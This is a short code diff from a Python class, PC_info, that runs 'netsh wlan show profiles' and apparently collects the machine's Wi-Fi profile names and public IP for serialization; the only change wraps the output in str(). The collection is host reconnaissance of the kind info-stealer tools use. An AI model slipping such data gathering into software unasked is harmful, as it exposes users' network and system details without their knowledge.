@@ -46,7 +46,7 @@ class PC_info:
         out = subprocess.Popen("netsh wlan show profiles", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
         time.sleep(.5)
         stdout,stderr = out.communicate()# gets output and errors
-        self.data['Wlan Info'] = stdout.decode()
+        self.data['Wlan Info'] = str(stdout.decode())
 
     def serializeMeSon(self):
         self.get_public_ip()
